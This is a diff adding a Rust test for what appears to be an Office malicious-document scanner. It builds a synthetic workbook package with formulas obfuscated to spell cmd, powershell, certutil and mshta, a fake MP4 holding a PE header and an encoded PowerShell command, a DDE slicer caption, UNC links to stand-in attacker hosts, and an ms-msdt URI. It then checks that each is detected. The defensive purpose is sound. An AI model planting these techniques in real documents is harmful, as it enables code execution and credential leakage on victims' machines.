@@ -6483,3 +6483,195 @@ fn e2e_activex_sig_ctrlprop_and_bessel_erf_threat_inspection() {
         "JSON missing VBA-CELL-070"
     );
 }
+
+#[test]
+fn e2e_powerpoint_media_slicer_mailmerge_and_stat_math_inspection() {
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Default Extension="mp4" ContentType="video/mp4"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+  <Override PartName="/xl/slicers/slicer1.xml" ContentType="application/vnd.ms-excel.slicer+xml"/>
+  <Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
+</Types>"#;
+
+    let package_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let workbook_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+  <Relationship Id="rId3" Type="http://schemas.microsoft.com/office/2007/relationships/slicer" Target="slicers/slicer1.xml"/>
+</Relationships>"#;
+
+    // Formulas using CONVERT, STANDARDIZE, ERROR.TYPE, EXPONDIST resolving to cmd, powershell, certutil, mshta
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1" t="str">
+        <f>CHAR(CONVERT(1, &quot;m&quot;, &quot;cm&quot;) - 1) &amp; CHAR(CONVERT(1, &quot;m&quot;, &quot;cm&quot;) + 9) &amp; CHAR(CONVERT(1, &quot;m&quot;, &quot;cm&quot;)) &amp; &quot;.exe&quot;</f>
+      </c>
+      <c r="B1" t="str">
+        <f>CHAR(STANDARDIZE(112, 0, 1)) &amp; &quot;owershell&quot;</f>
+      </c>
+      <c r="C1" t="str">
+        <f>CHAR(ERROR.TYPE(#REF!) + 95) &amp; &quot;ertutil&quot;</f>
+      </c>
+      <c r="D1" t="str">
+        <f>CHAR(EXPONDIST(0, 1, FALSE) * 109) &amp; &quot;shta&quot;</f>
+      </c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    // 1. PowerPoint Media part with disguised PE binary header and staged PowerShell command (VBA-CELL-071)
+    let mut ppt_media_bin = vec![0u8; 512];
+    ppt_media_bin[0] = b'M';
+    ppt_media_bin[1] = b'Z';
+    ppt_media_bin[0x3c] = 0x80;
+    ppt_media_bin[0x3d] = 0x00;
+    ppt_media_bin[0x3e] = 0x00;
+    ppt_media_bin[0x3f] = 0x00;
+    ppt_media_bin[0x80] = b'P';
+    ppt_media_bin[0x81] = b'E';
+    ppt_media_bin[0x82] = 0;
+    ppt_media_bin[0x83] = 0;
+    let staged_ps = b"powershell.exe -NoP -enc AAAA";
+    ppt_media_bin[0x90..0x90 + staged_ps.len()].copy_from_slice(staged_ps);
+
+    // 2. Excel Slicer part with remote UNC connection and cloaked DDE execution (VBA-CELL-072)
+    let slicer_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<slicer xmlns="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" name="Slicer1" caption="=cmd|'/c calc'!A1">
+  <slicerData connection="\\attacker-host\share\slicer_data"/>
+</slicer>"#;
+
+    // 3. Word settings XML with mail merge remote UNC header source and dangerous exploit URI (VBA-CELL-073)
+    let word_settings_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:mailMerge>
+    <w:mainDocumentType w:val="formLetters"/>
+    <w:headerSource w:val="\\evil-smb-server\share\merge_header.docx"/>
+    <w:query w:val="SELECT * FROM [data] WHERE url='ms-msdt:/id PCWDiagnostic'"/>
+  </w:mailMerge>
+</w:settings>"#;
+
+    let cfb = synthesize_cfb("VBAProject", "Module1", "Sub Test()\nEnd Sub\n", &[]);
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", package_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        ("ppt/media/media1.mp4", &ppt_media_bin),
+        ("xl/slicers/slicer1.xml", slicer_xml.as_bytes()),
+        ("word/settings.xml", word_settings_xml.as_bytes()),
+    ];
+
+    let zip_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify PowerPoint Media Track threats (VBA-CELL-071)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PowerPointMediaTrackOrActionAnomaly"
+                && (t.coordinate.contains("mediaTrack:peBinary")
+                    || t.coordinate.contains("mediaTrack:stagedScript"))),
+        "Should detect PowerPointMediaTrackOrActionAnomaly (VBA-CELL-071): {threats:?}"
+    );
+
+    // 2. Verify Excel Table / Slicer Native Connection threats (VBA-CELL-072)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "ExcelTableOrSlicerNativeConnectionAnomaly"
+                && (t.coordinate.contains("tableConnection:uncCoercion")
+                    || t.coordinate.contains("tableConnection:cloakedDde"))
+        ),
+        "Should detect ExcelTableOrSlicerNativeConnectionAnomaly (VBA-CELL-072): {threats:?}"
+    );
+
+    // 3. Verify Word Mail Merge Header Source threats (VBA-CELL-073)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "WordMailMergeHeaderSourceOrRecipientAnomaly"
+                && (t.coordinate.contains("mailMerge:uncCoercion")
+                    || t.coordinate.contains("mailMerge:dangerousProtocol"))
+        ),
+        "Should detect WordMailMergeHeaderSourceOrRecipientAnomaly (VBA-CELL-073): {threats:?}"
+    );
+
+    // 4. Verify dynamic formula de-obfuscation
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("cmd")),
+        "Cell A1 should resolve cmd threat through CONVERT evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through STANDARDIZE evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("certutil")),
+        "Cell C1 should resolve certutil threat through ERROR.TYPE evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "D1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("mshta")),
+        "Cell D1 should resolve mshta threat through EXPONDIST evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-071, VBA-CELL-072, VBA-CELL-073
+    let sarif = inspection_to_sarif(&inspection, "file:///test/ppt_media_slicer_mailmerge.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-071"),
+        "SARIF must contain VBA-CELL-071 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-072"),
+        "SARIF must contain VBA-CELL-072 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-073"),
+        "SARIF must contain VBA-CELL-073 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-071, VBA-CELL-072, VBA-CELL-073
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-071\""),
+        "JSON missing VBA-CELL-071"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-072\""),
+        "JSON missing VBA-CELL-072"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-073\""),
+        "JSON missing VBA-CELL-073"
+    );
+}
